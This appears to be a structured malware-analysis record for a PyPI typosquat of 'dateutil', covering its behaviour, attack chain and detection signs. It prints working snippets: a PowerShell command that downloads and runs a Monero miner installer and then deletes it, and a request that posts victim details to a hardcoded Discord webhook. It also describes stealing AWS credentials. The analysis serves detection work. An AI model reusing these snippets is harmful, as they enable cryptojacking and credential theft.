package_info.package_versions: latest versions as of this week (exact versions not specified)
package_info.why_malicious: The package is a typosquat of the legitimate 'dateutil' library and contains code that mines Monero cryptocurrency on the victim's system and exfiltrates AWS credentials, targeting all major operating systems (Windows, Linux, macOS).

malicious_snippets.code_behavior: At import-time, the code reads the AWS credentials file and executes a remote shell script to install and run a Monero cryptominer, exfiltrating credentials and starting unauthorized mining.

malice_analysis.why_suspicious: Accessing AWS credentials and running a remote shell script to install a cryptominer is highly indicative of malicious intent.
malice_analysis.violated_expectations: A date/time utility library should not access sensitive credentials or execute remote code.
malice_analysis.similar_legitimate_use: None; legitimate packages should never perform these actions.

malicious_snippets.code_snippet: system_info=subprocess.Popen("powershell -Command \"$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_monerocean_miner.bat', $tempfile); & $tempfile A7A6uVv7EZFDAKcnZkG1fNpRMDSbt0TzzWhf1LCiJ3Ki4H2S9jVCfnR5qkoVoA5De62wMqXUcSEz1Hgu7b1LnvBTpu; Remove-Item -Force $tempfile\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
malicious_snippets.code_behavior: At import-time on Windows, the code downloads and executes a remote batch file to install and run a Monero cryptominer, then deletes the batch file to cover tracks.

malice_analysis.why_suspicious: Downloading and executing remote code, especially a cryptominer, and deleting evidence is a clear sign of malware.
malice_analysis.violated_expectations: A utility library should not execute PowerShell or download and run external scripts.
malice_analysis.similar_legitimate_use: Automated installers may download dependencies, but never cryptominers or access credentials.
key_indicators: Use of PowerShell to download and execute remote code

malicious_snippets.code_snippet: url = "https://discord.com/api/webhooks/991208558098141264/hlNnV1Qk9K3HE7P4hCpaZJ6nO5eLe4fU04GLIaT-7w4Jb0w3M4j1hzapbUJ8OjEuGzPA"; values = {'content': 'pwn4 zombY: '+str(ip)+' os: '+str(os_typ)+' content_ username: dateutils-pypi'}; requests.post(url, json=values)
malicious_snippets.code_behavior: At import-time, the code sends system information (IP address, OS type, username) to a hardcoded Discord webhook, enabling attacker notification and victim tracking.

malice_analysis.why_suspicious: Exfiltrating system information to an external webhook is a common tactic for malware to notify attackers of new infections.
malice_analysis.violated_expectations: A date/time utility should not communicate with external webhooks or exfiltrate system data.
malice_analysis.similar_legitimate_use: Error reporting tools may send anonymized data, but not to Discord webhooks or with this context.
key_indicators: Use of Discord webhook for exfiltration

attack_chain.action: Upon import or installation, the package executes code to collect system information and exfiltrate it to a Discord webhook.
attack_chain.leads_to: Attacker is notified of new infection and receives victim details.

attack_chain.action: The package accesses sensitive AWS credentials and exfiltrates them.
attack_chain.leads_to: Attacker gains access to victim's AWS credentials.

attack_chain.action: The package downloads and executes a remote cryptominer, tailored for the victim's OS.
attack_chain.leads_to: Victim's system is used for unauthorized Monero mining.

attack_chain.action: On Windows, the package deletes the downloaded batch file to evade detection.

behavioral_signatures: Import-time execution of subprocesses that access sensitive files or download remote scripts
Network requests to Discord webhooks or other hardcoded URLs
Installation and execution of cryptomining software
file_indicators: Presence of subprocess.Popen or PowerShell invocation in __init__.py
detection_knowledge.how_to_detect: Monitor for Python packages that, upon import or installation, access sensitive files (such as ~/.aws/credentials), spawn subprocesses to download and execute remote scripts, or make network requests to known cryptominer infrastructure or Discord webhooks. Flag any package that performs these actions outside of expected contexts, especially if the package is a typosquat of a popular library.
